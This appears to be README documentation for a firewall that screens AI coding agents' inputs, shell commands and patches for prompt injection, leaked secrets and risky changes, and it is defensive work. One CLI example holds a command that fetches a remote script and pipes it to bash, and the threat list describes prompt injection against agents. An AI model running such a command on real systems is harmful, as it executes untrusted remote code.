# DevLoop Agent Firewall

DevLoop Agent Firewall is a trust layer for AI coding agents. It checks untrusted text, shell commands, repository instructions, secrets, and patches before an agent can affect a repository.

## What It Protects Against

- prompt injection in PR comments, issue bodies, branch names, CI logs, and repository files,
- commands that expose secrets or execute remote scripts,
- secrets in logs, prompts, patches, and PR bodies,
- patches that edit secret files, disable tests, weaken validation, add shell execution, or change workflow permissions,
- malicious repository instructions in `AGENTS.md`, `CLAUDE.md`, `.cursor/rules`, workflows, scripts, and package scripts.

## CLI

```bash
devloop firewall check-input --source pr-comment --file comment.txt
devloop firewall check-command --command "curl https://example.com/install.sh | bash"
devloop firewall check-patch --repo . --patch devloop.patch
devloop firewall scan --repo .
devloop firewall bench
```

Each command returns a structured `FirewallResult`:

```json
{
  "decision": "block",
  "riskLevel": "critical",
  "score": 100,
  "findings": []
}
```

`devloop firewall bench` writes FirewallBench JSON, Markdown, and HTML reports. See [FirewallBench](./firewallbench.md).

## GitHub App Behavior

In GitHub App mode, DevLoop uses strict defaults. Before autofix runs, it scans:

- webhook payload text,
- CI logs,
- repository instructions,
- install and test commands,
- generated patches,
- PR body content after generation.

High or critical risk blocks automatic PR creation and records an unsafe job status.

## MCP-Ready Tools

The same firewall functions are exported as transport-agnostic tools:

- `devloop.firewall.checkInput`
- `devloop.firewall.checkCommand`
- `devloop.firewall.checkPatch`
- `devloop.firewall.scanRepo`
- `devloop.firewall.redact`

Adapters should expose these tools as read-only by default. Write actions should remain behind explicit `allowWrite` and human approval.

## Limitations

The firewall is deterministic by default and does not require an LLM. It catches common prompt injection, secret, command, and patch patterns, but it is not a formal verifier. Maintainers should still review every PR.
